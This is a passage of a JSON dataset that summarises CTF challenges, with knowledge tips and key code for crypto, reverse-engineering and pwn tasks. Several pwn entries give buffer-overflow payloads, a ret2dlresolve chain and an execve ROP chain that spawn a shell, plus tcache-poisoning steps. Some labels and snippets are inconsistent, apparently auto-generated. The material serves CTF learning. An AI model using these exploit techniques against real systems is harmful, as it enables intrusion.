            "When dealing with seemingly corrupted or unopenable files within a CTF challenge, consider checking the file's magic bytes to determine if the file type is correct or has been altered. Use tools like `hexedit` to inspect and modify the hex values at the beginning of the file to match the expected file signature for its true format. Changing the file's extension to match its actual format, based on the corrected magic bytes, may then allow the file to open normally.\n    - Example Payload: To correct a JPEG file that starts with incorrect magic bytes, ensure the first few hex values are set to `FF D8 FF E0`, indicating a JPEG file, if it was mistakenly labeled or presented as another file type.",
            "In challenges where files within a package (like a PowerPoint `.pptx` file, which is essentially a zip archive) appear to be corrupted or relevant data seems hidden, rename the file extension to `.zip` and extract its contents to explore individual components. This action can reveal hidden or embedded files that were not readily apparent, providing new avenues for investigation and potentially uncovering concealed flags within file directories such as `/ppt/media`."
        ],
        "key": "```python\ndef open_image(file_path):\n    with open(file_path, 'rb') as f:\n        data = f.read()\n    if data.startswith(b'\\x00\\x00\\x00\\x00'):\n        data = b'\\xFF\\xD8\\xFF\\xE0' + data[4:]  # Fixing the JPEG header\n    with open(file_path, 'wb') as f:\n        f.write(data)\n\nopen_image('image1.png')\n```"
    },
    {
        "name": "A Prime Problem",
        "write_up": "dataset/raw/A Prime Problem.md",
        "type": "crypto",
        "competition": [
            "TexSAW/2023",
            "https://ctftime.org/event/1959/tasks/"
        ],
        "score": 400,
        "max_score": 400,
        "difficulty": 1.0,
        "knowledge": [
            "When given the modulus `n` in an RSA challenge and knowing that the primes `p` and `q` were generated in a way that makes `q` very close to `p` (as in, `q` is the next prime after `p` plus a relatively small integer `r`), the Fermat's factorization method can be a viable approach to factor `n`. This is especially effective under conditions laid out by the challenge or hinting towards small difference between the prime factors. Example code snippet for applying Fermat's factorization:\n```python\ndef isqrt(n):  \n   x = n  \n   y = (x + n // x) // 2  \n   while (y < x):  \n       x = y  \n       y = (x + n // x) // 2  \n   return x\n\ndef fermat(n):  \n   t0 = isqrt(n) + 1  \n   counter = 0  \n   t = t0 + counter  \n   temp = isqrt((t * t) - n)  \n   while ((temp * temp) != ((t * t) - n)):  \n       counter += 1  \n       t = t0 + counter  \n       temp = isqrt((t * t) - n)  \n   s = temp  \n   p = t + s  \n   q = t - s  \n   return p, q\n```",
            "After factoring `n` into `p` and `q`, the RSA algorithm requires calculating the private exponent `d` from the public exponent `e` and the totient `\u03c6(n)` (where `\u03c6(n) = (p-1)*(q-1)`), to decrypt the message. The modular inverse of `e` with respect to `\u03c6(n)` gives the value of `d`. This is a fundamental step in RSA decryption once the prime factors are known. Example code showing calculation of `d`:\n```python\nphi = (p-1)*(q-1)  \nd = pow(e, -1, phi)\n```"
        ],
        "key": "```python\ndef isqrt(n):  \n   x = n  \n   y = (x + n // x) // 2  \n   while (y < x):  \n       x = y  \n       y = (x + n // x) // 2  \n   return x\n\ndef fermat(n):  \n   t0 = isqrt(n) + 1  \n   counter = 0  \n   t = t0 + counter  \n   temp = isqrt((t * t) - n)  \n   while ((temp * temp) != ((t * t) - n)):  \n       counter += 1  \n       t = t0 + counter  \n       temp = isqrt((t * t) - n)  \n   s = temp  \n   p = t + s  \n   q = t - s  \n   return p, q  \n```"
    },
    {
        "name": "A secure database",
        "write_up": "dataset/raw/A secure database.md",
        "type": "The type of the CTF challenge described in the write-up is a `reverse` challenge.",
        "competition": [
            "SharkyCTF/2020",
            "https://ctftime.org/event/1034/tasks/"
        ],
        "score": 299,
        "max_score": 600,
        "difficulty": 0.49833333333333335,
        "knowledge": [
            "In challenges involving encrypted data retrieval where the correct password is required, analysis of the binary executable handling the password check can reveal hardcoded strings or comparison routines. These routines might compare user input with obfuscated or encoded passwords within the program. A methodical approach is to inspect the binary in a disassembler or a decompiler (such as Ghidra), identify the password handling and comparison mechanism, and decode or reverse-engineer the mechanism to obtain the correct password.",
            "For binary analysis challenges where understanding complex binary logic is time-consuming or infeasible, employing symbolic execution frameworks like `angr` can automate the extraction of passwords or other critical data. This technique involves scripting with `angr` to identify paths within the binary that lead to a successful execution state (e.g., correct password validation) and avoiding paths that lead to failure states. This can significantly reduce the time and effort required to solve challenges that would otherwise require intricate binary reverse engineering. \n   - Sample `angr` script structure to solve for a password:\n     ```python\n     import angr\n     import claripy\n     \n     binary_path = './binary_name'\n     project = angr.Project(binary_path, auto_load_libs=False)\n     password = claripy.BVS('password', 8 * 16)  # Adjust length as necessary\n     state = project.factory.entry_state(args=[binary_path], stdin=password)\n     simgr = project.factory.simulation_manager(state)\n     simgr.explore(find=0xAddressOfSuccess, avoid=0xAddressOfFailure)  # Replace with actual addresses\n     found = simgr.found[0]\n     print(found.posix.dumps(0))  # 0 represents file descriptor for stdin\n     ```\n   This strategy leverages `angr` to navigate through the binary programmatically, focusing on state exploration to dynamically deduce the correct input (e.g., password) by aiming for a success indicator (e.g., a success message) while avoiding failure conditions."
        ],
        "key": "```c\nundefined4 FUN_0804870a(void)  \n{  \n size_t sVar1;  \n undefined4 uVar2;  \n int *in_ECX;  \n int in_GS_OFFSET;  \n bool bVar3;  \n undefined4 local_30;  \n undefined4 local_2c;  \n undefined4 local_28;  \n undefined4 local_24;  \n int local_20;  \n undefined4 uStack24;  \n int *local_14;  \n  \n uStack24 = 0x8048716;  \n local_20 = *(int *)(in_GS_OFFSET + 0x14);  \n local_14 = in_ECX;  \n if (*in_ECX != 2) {  \n   __printf_chk();  \n                   /* WARNING: Subroutine does not return */  \n   exit(1);  \n }  \n _DAT_0804d0a4 = FUN_08048b70();  \n local_30 = 0;  \n local_2c = 0;  \n local_28 = 0;  \n local_24 = 0;  \n __printf_chk();  \n fgets(&DAT_0804d0c0,0x50,*(FILE **)PTR_stdin_0804cffc);  \n sVar1 = strcspn(&DAT_0804d0c0,\"\\n\");  \n (&DAT_0804d0c0)[sVar1] = 0;  \n strncpy((char *)&local_30,&DAT_0804d0c0,0x10);  \n bVar3 = false;  \n FUN_08048a90();  \n if (bVar3) {  \n   puts(\"ok\");  \n   if (((((DAT_0804d0c0 == *PTR_DAT_0804d068) && (DAT_0804d0c1 ==\nPTR_DAT_0804d068[1])) &&  \n        (DAT_0804d0c2 == PTR_DAT_0804d068[2])) &&  \n       (((DAT_0804d0c3 == PTR_DAT_0804d068[3] && (DAT_0804d0c4 == PTR_DAT_0804d068[4])) &&  \n        ((DAT_0804d0c5 == PTR_DAT_0804d068[5] &&  \n         ((DAT_0804d0c6 == PTR_DAT_0804d068[6] && (DAT_0804d0c7 == PTR_DAT_0804d068[7])))))))) &&  \n      ((DAT_0804d0c8 == PTR_DAT_0804d068[8] &&  \n       (((((DAT_0804d0c9 == PTR_DAT_0804d068[9] && (DAT_0804d0ca == PTR_DAT_0804d068[10])) &&  \n          (DAT_0804d0cb == PTR_DAT_0804d068[0xb])) &&  \n         ((DAT_0804d0cc == PTR_DAT_0804d068[0xc] && (DAT_0804d0cd == PTR_DAT_0804d068[0xd])))) &&  \n        (DAT_0804d0ce == PTR_DAT_0804d068[0xe])))))) {  \n     puts(\"The password is valid.\");  \n     FUN_08048c60();  \n     puts(\"Received and *hopefully* sucessfuly decrypted the database with the given password.\");  \n     uVar2 = 0;  \n   }  \n   else {  \n     puts(\"Wrong password sorry, exiting.\");  \n     uVar2 = 1;  \n   }  \n   if (local_20 != *(int *)(in_GS_OFFSET + 0x14)) {  \n     FUN_0804a460();  \n     __libc_start_main();  \n     do {  \n                   /* WARNING: Do nothing block with infinite loop */  \n     } while( true );  \n   }  \n   return uVar2;  \n }  \n func_0x8b927754();  \n                   /* WARNING: Bad instruction - Truncating control flow here */  \n halt_baddata();  \n}\n```"
    },
    {
        "name": "A to Z",
        "write_up": "dataset/raw/A to Z.md",
        "type": "crypto",
        "competition": [
            "MetaCTF/2021",
            "https://ctftime.org/event/1476/tasks/"
        ],
        "score": 100,
        "max_score": 550,
        "difficulty": 0.18181818181818182,
        "knowledge": [
            "When facing a substitution cipher challenge, initially employ common letter shift techniques like ROT-N ciphers, where N ranges from 1 to 25, to quickly test for simple encryptions. Tools like the one available at http://theblob.org/rot.cgi can facilitate this process by efficiently iterating through all potential shifts. Example payload for ROT-13 (a common shift): `lmufhsb_eu_ao_hmr_jqmvh`",
            "If common substitution methods such as ROT-N ciphers do not yield results, consider employing the Atbash cipher, which is a special form of substitution cipher where each letter is mapped to its reverse counterpart in the alphabet (A <-> Z, B <-> Y, etc.). Tools like CyberChef (https://gchq.github.io/CyberChef/) can be used to apply an Atbash cipher easily. Knowledge of various types of substitution ciphers and resources that list them, like http://practicalcryptography.com/ciphers/substitution-category/, is invaluable for expanding one\u2019s capability to identify and solve cipher challenges more effectively."
        ],
        "key": "```python\ndef atbash_cipher(text):\n    def atbash_char(c):\n        if 'a' <= c <= 'z':\n            return chr(ord('z') - (ord(c) - ord('a')))\n        elif 'A' <= c <= 'Z':\n            return chr(ord('Z') - (ord(c) - ord('A')))\n        else:\n            return c\n\n    return ''.join(atbash_char(c) for c in text)\n\nencrypted_flag = \"yzhsufo_rh_nb_uze_wdziu\"\ndecrypted_flag = atbash_cipher(encrypted_flag)\nprint(decrypted_flag)\n```"
    },
    {
        "name": "A Tour of x86 - Part 1",
        "write_up": "dataset/raw/A Tour of x86 - Part 1.md",
        "type": "The type of challenge is: reverse",
        "competition": [
            "CSAW/2018/Quals",
            "https://ctftime.org/event/633/tasks/"
        ],
        "score": 50,
        "max_score": 1285,
        "difficulty": 0.038910505836575876,
        "knowledge": [
            "When faced with assembly code challenges, especially those running in 16-bit real-mode, understanding the role and default behaviors of specific registers and operations is crucial. For example, the `xor` operation with the same register (e.g., `xor dh, dh`) will always reset that register to 0. Being familiar with these operations can help decode the logic of the assembly code and solve challenges that ask for the values of certain registers after specific lines of code execute.",
            "In challenges involving assembly language, where you're required to deduce the state of the system at specific points (like register values), it's important to trace back the operations affecting those registers. This could involve identifying where a register is set and how it's manipulated across the code. For example, understanding that a register `si` is set to the value of another register `sp`, which in turn is set to 0 in a previous operation (`mov sp, cx` with `cx` set to 0), allows you to accurately determine the register's value at a given point without executing the code.\n\n**Example Payloads:**",
            "To answer \"What is the value of `dh` after line 129 executes?\", since the operation is `xor dh, dh`, any payload or response related to this operation should return `0x00`.",
            "For deducing the value of `ax` after certain operations like `mov al, 't'` and `mov ah, 0x0e`, the payload in solving the puzzle might look like calculating the combined value, resulting in `0x0e74`."
        ],
        "key": "```assembly\n; stage-1.asm\n\nsection .text\n    org 0x7c00\n\nstart:\n    xor dh, dh          ; Line 129\n    ...\n    mov gs, dx          ; Line 145\n    ...\n    mov si, sp          ; Line 151\n    ...\n    mov al, 't'         ; Line 168\n    mov ah, 0x0e        ; Line 169\n    ...\n    mov al, [si]        ; Line 197\n    mov ah, 0x0e        ; Line 199\n    ...\n```"
    },
    {
        "name": "A Weird List of Sequences",
        "write_up": "dataset/raw/A Weird List of Sequences.md",
        "type": "misc",
        "competition": [
            "X-MAS/2018",
            "https://ctftime.org/event/724/tasks/"
        ],
        "score": 392,
        "max_score": 591,
        "difficulty": 0.6632825719120136,
        "knowledge": [
            "When facing a scenario requiring interaction with a captcha-protected service in a CTF challenge, utilizing a brute-force script to solve the captcha by generating MD5 hashes and comparing them can be effective. This method is applicable when the captcha is based on a known or guessable pattern that can be enumerated through brute force. For instance, if the captcha is a text or number challenge that can be hashed and checked against a given MD5 hash, a script can be used to automate the process.",
            "Automating the process of solving challenges that involve predicting or generating sequences (like number sequences) can significantly increase efficiency, especially when external tools or databases are available for assistance. In cases where a challenge involves identifying and continuing a sequence of numbers, the Online Encyclopedia of Integer Sequences (OEIS.org) can be a valuable resource. By automating the submission of sequences to OEIS and parsing the response for the next number in the sequence, challenges can be solved more rapidly and accurately, avoiding manual lookup and potential human error.\n   \nExample tool/library usage in the automation script:\n- `requests` library for sending GET requests to OEIS.org to retrieve information about the number sequence.\n- `pyquery` or similar HTML parsing libraries to extract the required information (e.g., the next number in the sequence) from the OEIS.org response."
        ],
        "key": "```python\nimport hashlib\n\ndef md5_bruteforce(target_hash):\n    for i in range(1000000):\n        if hashlib.md5(str(i).encode()).hexdigest() == target_hash:\n            return i\n    return None\n```"
    },
    {
        "name": "A3S",
        "write_up": "dataset/raw/A3S.md",
        "type": "This write-up describes a crypto challenge.",
        "competition": [
            "RaRCTF/2021",
            "https://ctftime.org/event/1342/tasks/"
        ],
        "score": 800,
        "max_score": 1500,
        "difficulty": 0.5333333333333333,
        "knowledge": [
            "When dealing with a custom encryption algorithm that resembles a well-known cipher but operates on a different numerical base (such as trinary systems instead of binary), analyzing the properties of the S-Box can reveal significant vulnerabilities. If the S-Box operations are found to be affine transformations (meaning they can be represented as linear transformations followed by a translation), the entire encryption process could potentially be reduced to an affine transformation of the plaintext. This property can be exploited to algebraically analyze and break the cipher. For example, the realization that an S-Box operation in a trinary-based encryption system (like the modified AES in the challenge) maintains affine properties allows for a straightforward decryption process once the affine relations are reversed. To check if an S-Box is an affine transformation, one can test if the sum of the outputs for two inputs equals the output for the sum of those inputs:\n    - SBOX[a] + SBOX[b] == SBOX[a+b]",
            "In cryptographic challenges where the key schedule (the process of expanding a short key into a series of separate round keys) is influenced by the properties of the S-Box, discovering that the S-Box performs affine transformations significantly impacts the complexity of the key expansion process, making it linear. This insight facilitates the decryption of ciphertexts if one can model the encryption and key expansion as mathematical operations in an appropriate finite field (such as GF(3) for trinary operations). By casting the problem into a system of linear equations within the finite field, one can potentially solve for the original encryption key or deduce key properties that allow decrypting the ciphertext. This approach hinges on algebraic manipulation using tools like SageMath to perform symbolic calculations and solve the systems of equations. For instance, techniques adapted to work in GF(3) and modifications to ensure compatibility with the custom encryption's mathematical operations are critical steps to model and solve the problem algebraically."
        ],
        "key": "```python\n# Encryption routine  \ndef a3s(msg, key):  \n   m       = byt_to_int(msg)  \n   k       = byt_to_int(key)  \n   m       = up(int_to_tyt(m), W_SIZE ** 2, int_to_tyt(0)[0])[-1] # Fixed block size  \n   k       = int_to_tyt(k)  \n   keys    = expand(k) # tryte array  \n   assert len(keys) == KEYLEN\n\n   ctt = T_xor(m, keys[0])\n\n   for r in range(1, len(keys) - 1):  \n       ctt = sub_wrd(ctt)                          # SUB...  \n       ctt = tuple([ctt[i] for i in SHIFT_ROWS])   # SHIFT...  \n       ctt = mix_columns(ctt)                      # MIX...  \n       ctt = T_xor(ctt, keys[r])                   # ADD!\n\n   ctt  = sub_wrd(ctt)  \n   ctt  = tuple([ctt[i] for i in SHIFT_ROWS])  \n   ctt  = T_xor(ctt, keys[-1])                     # last key\n\n   ctt = tyt_to_int(ctt)  \n   return int_to_byt(ctt)  \n```"
    },
    {
        "name": "AAAAAAAAAAAAAAAA",
        "write_up": "dataset/raw/AAAAAAAAAAAAAAAA.md",
        "type": "pwn",
        "competition": [
            "UTCTF/2022",
            "https://ctftime.org/event/1582/tasks/"
        ],
        "score": 100,
        "max_score": 1000,
        "difficulty": 0.1,
        "knowledge": [
            "When exploiting buffer overflow vulnerabilities in programs that use unsafe functions like `gets`, which does not limit the amount of data read and can therefore overflow buffers, crafting a payload that exploits this vulnerability to overwrite adjacent memory is a fundamental technique. In scenarios where a specific condition (like a variable check) must be met post-overflow, the payload can be designed to fill the buffer up to the point of the target variable and then manipulate it as required. For example, if a buffer is 0x78 bytes from the base of a stack frame and a variable that controls program flow is directly after, filling the buffer with `0x78 - 0x9` bytes of arbitrary data followed by the desired value to manipulate the variable would achieve control over the program flow.\n\nExample payload: \n```python\npayload = b'A' * (0x78 - 0x9) + b'B'\n```",
            "In the presence of Return-Oriented Programming (ROP) opportunities, especially when the stack is executable (NX bit disabled) and stack canary protections are not in place, control over the execution flow can be obtained by overwriting the return address on the stack. If direct function calls like `execve` to spawn a shell are not feasible (due to reasons like protections, or the function behaves unexpectedly), utilizing gadgets within the binary or the concept of ret2dlresolve to call system functions indirectly can be a potent strategy. This technique involves arranging the stack or registers in a way that when returning control to a specific gadget or function, it will execute system calls with parameters we control, leading to arbitrary code execution.\n\nExample payload (using ret2dlresolve):\n```python\nfrom pwn import *\n\nbinary = context.binary = ELF('./binary_name', checksec=False)\nrop = ROP(binary)\nret = rop.find_gadget(['ret'])[0]\n\ndl = Ret2dlresolvePayload(binary, symbol='system', args=['sh'])\n\nrop.raw(ret)\nrop.gets(dl.data_addr)\nrop.ret2dlresolve(dl)\n\npayload  = b'A' * 0x78 # Buffer overflow up to return address\npayload += rop.chain()\npayload += b'\\n'\npayload += dl.payload\n```"
        ],
        "key": "```c\nundefined8 main(void)  \n{  \n char local_78 [111];  \n char local_9;  \n  \n local_9 = '\\0';  \n gets(local_78);  \n if (local_9 == 'B') {  \n   get_flag();  \n }  \n return 0;  \n}  \n\nvoid get_flag(void)  \n{  \n char *local_18;  \n undefined8 local_10;  \n  \n local_18 = \"/bin/sh\";  \n local_10 = 0;  \n execve(\"/bin/sh\",&local_18,(char **)0x0);  \n return;  \n}  \n```"
    },
    {
        "name": "Ace of Spades",
        "write_up": "dataset/raw/Ace of Spades.md",
        "type": "pwn",
        "competition": [
            "PwnThyBytes/2019",
            "https://ctftime.org/event/756/tasks/"
        ],
        "score": 964,
        "max_score": 1000,
        "difficulty": 0.964,
        "knowledge": [
            "In scenarios involving buffer overflow or memory corruption vulnerabilities, utilizing overlapping buffers with functions like `strcpy` can lead to duplicate or altered memory content. This can be exploited in a controlled manner to affect program behavior or manipulate memory, especially when certain string lengths trigger unintended behavior. This principle is generally applicable in exploiting unsafe string operations where boundary checks are not properly implemented. Example payload and scenario setup:\n\n```python\ndef exploit_strcpy_bug(program):\n    for _ in range(52):  # Triggering the condition\n        draw_card(program)  \n    current_hand = print_hand(program)  \n    for _ in range(52):  \n        discard_card(program)  \n        new_hand = print_hand(program)  \n        if current_hand[1:] != new_hand:  \n            print('Exploited strcpy bug')  \n        current_hand = new_hand  \n    fold_hand(program)\n```",
            "In challenges that involve deterministic outcomes from pseudo-random number generators (RNGs) or where the RNG seed is not properly randomized (e.g., stored in a predictable location or read from a predictable source like `/dev/urandom` without error checking), manipulating or predicting the state of the RNG can lead to controlled or predictable behavior of the application. This can be particularly useful in bypassing randomness-based security mechanisms or influencing the application to enter a favorable state. Example strategy: Overwhelm the system RNG to force `read()` to return a predictable number of bytes, or exploit predictable seed placement to calculate future RNG outputs.\n\n*Note: Specific payload generation for RNG manipulation depends on the application's implementation details and RNG characteristics, thus a general payload example is not provided. The concept, however, is universally applicable for similar vulnerabilities across different scenarios.*"
        ],
        "key": "```c\n.text:00000D7D                 lea     eax, (hand+1 - 2F98h)[ebx]  \n.text:00000D83                 sub     esp, 8  \n.text:00000D86                 push    eax             ; src  \n.text:00000D87                 lea     eax, (hand - 2F98h)[ebx]  \n.text:00000D8D                 push    eax             ; dest  \n.text:00000D8E                 call    _strcpy  \n```"
    },
    {
        "name": "aces-aes",
        "write_up": "dataset/raw/aces-aes.md",
        "type": "crypto",
        "competition": [
            "JerseyCTF/2024",
            "https://ctftime.org/event/2230/tasks/"
        ],
        "score": 1000,
        "max_score": 1000,
        "difficulty": 1.0,
        "knowledge": [
            "In challenges involving encrypted messages, scrutinizing the accompanying files for clues is vital. An incomplete encryption scheme code fragment, ciphertext, and possibly relevant logs or external postings can provide critical insights for constructing or deconstructing the encryption. Upon discovering parameters like the encryption mode or password, one can leverage libraries like `pyaes` for Advanced Encryption Standard (AES) functionalities and `pbkdf2` for key derivation. This situation underscores the importance of closely examining all provided materials for hidden clues that can aid in decrypting messages.\n   - Example insight: The password for encryption schemes could be derived from contextual clues hidden in seemingly unrelated files, such as logs referring to specific keywords or names (e.g., the true name of a character with spaces replaced by dashes).",
            "The initialization vector (IV) for an encryption scheme might not be explicitly given and may require deductive reasoning or external exploration, such as analyzing different challenges or conducting open-source intelligence (OSINT) on hacker forums or related websites. This emphasizes the significance of considering all aspects of a challenge, including seemingly unrelated components or other challenge series. Once the IV is known, along with the key derived from the correct password and salt via PBKDF2, one can decrypt the ciphertext using the identified encryption mode, revealing the plaintext message.\n   - Example insight: In the context of AES in Counter (CTR) mode, both the key and IV are crucial for decryption. The key can be derived using PBKDF2 with a known password and salt, while the IV might need to be obtained from external sources or inferred from the challenge context."
        ],
        "key": "```python\nimport secrets  \nimport pbkdf2  \nimport pyaes  \nimport binascii  \nfrom Crypto.Util.number import *\n\npassword = 'anung-un-rama'  \nsoSalty = binascii.unhexlify(b'8b70821d8d9af4a7df4abe98a8fb72d1')  \nprint(bytes_to_long(soSalty).bit_length())  \nkey = pbkdf2.PBKDF2(password, soSalty).read(32)\n\nprint(binascii.hexlify(key))\n\n#ENCRYPTION  \nct = binascii.unhexlify(b'8075f975522d23ffb444c3620c3ba69caac451e90ac3b21c08b35b67634289614d434ba57177fa371eda83b7eb70a4cfc348716c5b3af8ad48457ca71689299f4ee31d63dfd6e19910b751ef0e5f8e20c1e117ac6aedb39e4c5acfe7a128da9b07c8d2540691902cea21bcf15ad980bb888dfadc4513d3ad9cf2ffd7c069c282abb53e7cf4c64718136a93ad4497948d586bca9b5eefa34c81f10804c997f81fd8c9354eb0ce23cd8235a05d76e86dc53a786d773933827e64ec39b3297a6ad47818aa36403517b7d8b9b194d8c24917dd158d7f6d3add8aad516d21f2e59f3ab084ec01e7eea83246fb908e3d643663b2c5')  \niv = 103885120316185268520321810574705365557388145533300929074282868484870266792680  \nassert iv.bit_length() == 256  \nplaintext = 'REDACTED'  \naes = pyaes.AESModeOfOperationCTR(key, pyaes.Counter(iv)) # CTR mode  \npt = aes.decrypt(ct)  \nprint('DECRYPTED:', pt)  \n```"
    },
    {
        "name": "Ada Lovelace",
        "write_up": "dataset/raw/Ada Lovelace.md",
        "type": "pwn",
        "competition": [
            "CyberHeroines/2023",
            "https://ctftime.org/event/2054/tasks/"
        ],
        "score": 400,
        "max_score": 400,
        "difficulty": 1.0,
        "knowledge": [
            "In a challenge where exploitation of the `tcache` (thread-local cache) is hinted, one can manipulate the `tcache` list through a tcache poisoning attack by carefully deallocating (freeing) and reallocating memory chunks to control the memory layout. This approach can enable the overwrite of specific memory addresses with arbitrary values. To execute this attack, it's essential to perform operations in the following order: allocate two chunks, free them in reverse order to manipulate the `tcache` linked list, and then use a subsequent allocation to write to a controlled address.",
            "When dealing with challenges that mention specific GLIBC versions and hint towards using system metadata (like a \"super secret xor key\"), it's crucial to understand and exploit the GLIBC's safe-linking mechanism for the `tcache`. Safe-linking protects pointers by XORing them with a secret derived from their memory location. By obtaining a leaked pointer value (presented in the challenge as the xor key), one can reverse the safe-linking protection by XORing the target address with the leaked key, allowing for a controlled write operation to a location like a global variable. This technique is particularly effective when ASLR (Address Space Layout Randomization) is disabled or when the leak allows for the prediction or calculation of the secret key.\n  \n   Example Payload Step: `F0e9d4000050550000` where `e9d4000050550000` is the XORed payload address derived from the target address and the leaked \"super secret xor key\", designed to overwrite the specific memory address with desired values using the tcache poisoning technique."
        ],
        "key": "```c\nvoid print_hints(void)  \n{  \n undefined8 *__ptr;  \n  \n printf(\"Overwrite the value at %p so it\\'s \\'flag\\'\\n\",&check_var);  \n __ptr = (undefined8 *)malloc(8);  \n free(__ptr);  \n printf(\"Your super secret xor key is %p\\n\",*__ptr);  \n return;  \n}  \n\nvoid check_flag(void)  \n{  \n int iVar1;  \n FILE *__stream;  \n char *pcVar2;  \n char acStack264 [256];  \n  \n iVar1 = bcmp(&check_var,\"flag\",5);  \n if (iVar1 == 0) {  \n   __stream = fopen(\"./flag.txt\",\"r\");  \n   if (__stream != (FILE *)0x0) {  \n     pcVar2 = fgets(acStack264,0x100,__stream);  \n     if (pcVar2 != (char *)0x0) {  \n       puts(acStack264);  \n     }  \n     fclose(__stream);  \n   }  \n }  \n return;  \n}  \n\nvoid allocate_cmd(size_t size)  \n{  \n void *pvVar1;  \n long lVar2;  \n  \n lVar2 = 0;  \n while( true ) {  \n   if (lVar2 == 160) {  \n     puts(\"Max number of chunks reached!\");  \n     return;  \n   }  \n   if (*(long *)(chunks + lVar2) == 0) break;  \n   lVar2 = lVar2 + 16;  \n }  \n pvVar1 = malloc(size);  \n *(void **)(chunks + lVar2) = pvVar1;  \n *(size_t *)(chunks + lVar2 + 8) = size;  \n return;  \n}  \n\nvoid delete_cmd(uint index)  \n{  \n if ((index < 10) && (*(void **)(chunks + (ulong)index * 0x10) != (void *)0x0)) {  \n   free(*(void **)(chunks + (ulong)index * 0x10));  \n   return;  \n }  \n puts(\"Invalid chunk index!\");  \n return;  \n}  \n\nvoid fill_cmd(uint index,undefined8 values)  \n{  \n uint uVar1;  \n long lVar2;  \n char *__s;  \n undefined auStack280 [264];  \n  \n if ((index < 10) && (lVar2 = (ulong)index * 0x10, *(long *)(chunks + lVar2) != 0)) {  \n   uVar1 = decode_hex(values,auStack280);  \n   if ((-1 < (int)uVar1) && ((ulong)uVar1 <= *(ulong *)(chunks + lVar2 + 8))) {  \n     memcpy(*(void **)(chunks + lVar2),auStack280,(ulong)uVar1);  \n     return;  \n   }  \n   __s = \"Invalid data or exceeds chunk size.\";  \n }  \n else {  \n   __s = \"Invalid chunk index.\";  \n }  \n puts(__s);  \n return;  \n}  \n```"
    },
    {
        "name": "Admin CLI",
        "write_up": "dataset/raw/Admin CLI.md",
        "type": "This write-up describes a hash collision challenge in a Java class file where the goal is to create a URL that has the same hash code as specified in the challenge. Based on the provided information, I would classify this challenge as a **crypto** challenge.",
        "competition": [
            "FE-CTF/2023",
            "https://ctftime.org/event/1979/tasks/"
        ],
        "score": 1,
        "max_score": 1,
        "difficulty": 1.0,
        "knowledge": [
            "In challenges involving hash collision, if the goal is to match a specific hash code for an object (like a URL in Java), one can manipulate parts of the object that don't influence the hash function to inject arbitrary data without affecting the hash outcome. Specifically, in Java's `java.net.URL` class, the authority part of the URL can be set to arbitrary data (such as an API_KEY or flag placeholder) because the hash code calculation does not consider the authority part, allowing for the injection of data while maintaining the desired hash code.",
            "When a challenge's logic involves calculating hash codes with conditions that include URL components like the port, it's possible to manipulate the port number to achieve a desired hash code. Since the port number directly influences the hash code in a predictable manner (adding its numeric value to the hash), one can calculate the difference needed from the target hash code and use that as the port number in the URL, thus matching the target hash code while controlling other parts of the URL for further exploitation, such as leveraging vulnerabilities like Log4Shell."
        ],
        "key": "```java  \npublic class Main {\n\n\t/* flag{....} */  \n\tprivate static String API_KEY = Base64.getUrlEncoder().encodeToString(System.getenv(\"FLAG\").getBytes());  \n  \n\t/* Doesn't seem to be authorized, I don't know why... */  \n\t/* https://backend.fe-ctf.local/removePoints?teamId=0&amount=1000&key=api_key */  \n\tprivate static int HASH_CODE = -615519892;\n\n\t/* Should be safe, right? */  \n\tprivate static Logger logger = LogManager.getLogger(Main.class);  \n  \n\tpublic static void main(String[] args) {  \n\t\tConfigurator.setLevel(Main.class.getName(), Level.INFO);  \n\t\tScanner s = new Scanner(System.in);  \n\t\tSystem.out.print(\"Enter URL: \");  \n\t\tString input = s.nextLine();  \n\t\ts.close();  \n\t\ttry {  \n\t\t\tURL url = new URL(input.replaceAll(\"API_KEY\", API_KEY));  \n\t\t\tif (url.hashCode() == HASH_CODE && url.getHost().equals(\"backend.fe-ctf.local\")) {  \nlogger.info(\"URLs Matched, sending request to {}\", url);  \n\t\t\t\t/* TODO: Figure out how to send request  \n\t\t\t\tHttpURLConnection con = (HttpURLConnection) url.openConnection();  \n\t\t\t\tcon.setRequestMethod(\"GET\")  \n\t\t\t\t*/  \n\t\t\t} else {  \n\t\t\t\tlogger.warn(\"URLs are not equal!\");  \n\t\t\t}  \n\t\t} catch (MalformedURLException e) {  \n\t\t\tlogger.error(\"Invalid URL\");  \n\t\t\tSystem.exit(1);  \n\t\t}  \n\t}  \n}  \n```"
    },
    {
        "name": "Admin",
        "write_up": "dataset/raw/Admin.md",
        "type": "pwn",
        "competition": [
            "ASIS/2020/Quals",
            "https://ctftime.org/event/964/tasks/"
        ],
        "score": -1.0,
        "max_score": 375,
        "difficulty": -1,
        "knowledge": [
            "When exploiting binary files with a buffer overflow vulnerability due to unsafe functions like `gets()`, and when the executable has certain protections like NX enabled but lacks stack canaries and PIE (Position Independent Executable), crafting a Return-Oriented Programming (ROP) chain is an effective technique. This method involves finding and utilizing gadgets within the binary or loaded libraries to control the behavior of the application and ultimately execute arbitrary code, such as spawning a shell. In the presence of stack execution prevention (NX), ROP can be used as it does not rely on executing code from the stack but rather executes existing code snippets (\"gadgets\") in a sequence chosen by the attacker.",
            "In preparing a ROP chain for an `execve(\"/bin/sh\", NULL, NULL)` syscall on an x86_64 architecture, specific registers need to be set up accordingly: `rdi` must contain the address of the command string (e.g., \"/bin/sh\"), `rsi` should be zeroed out (NULL pointer for argv), and `rdx` also needs to be zeroed out (NULL pointer for envp). Following the preparation of these registers, invoking the `syscall` instruction will trigger the execution of `execve` with the desired command. This setup typically involves gadgets to pop values into the required registers (`pop_rdi`, `pop_rsi`, `pop_rdx`) and a way to trigger the syscall. The example payload demonstrates this sequence, including a method to write the \"/bin/sh\" string into memory before executing the syscall, by redirecting the execution flow to a `gets()` function call with a controlled destination address.\n\nExample payload snippet:\n```\nrop = flat([\n    'a'*72, # Padding\n    pop_rdi, # Gadget to pop next value into rdi\n    write_mem, # Address to store \"/bin/sh\"\n    gets, # Call gets to write \"/bin/sh\" into write_mem\n    pop_rdi, write_mem, # Prepare rdi again for execve syscall\n    pop_rax, 0x3b, # Set rax to syscall number for execve\n    pop_rsi, 0x0, # Zero out rsi\n    pop_rdx, 0x0, # Zero out rdx\n    syscall # Trigger the syscall\n])\n```"
        ],
        "key": "```c\nvoid main(void)\n{  \n int iVar1;  \n undefined auStack72 [64];  \n  \n puts(&UNK_004923e4);  \n gets(auStack72); // vulnerable call to gets  \n  \n iVar1 = func_0x00400498(auStack72,&UNK_004923ef);  \n if (iVar1 == 0) {  \n   puts(&UNK_004923f5);  \n }  \n else {  \n   printf(&UNK_00492403,auStack72);  \n }  \n return;  \n}\n```"
    },
    {
        "name": "Advanced Json Cutifier",
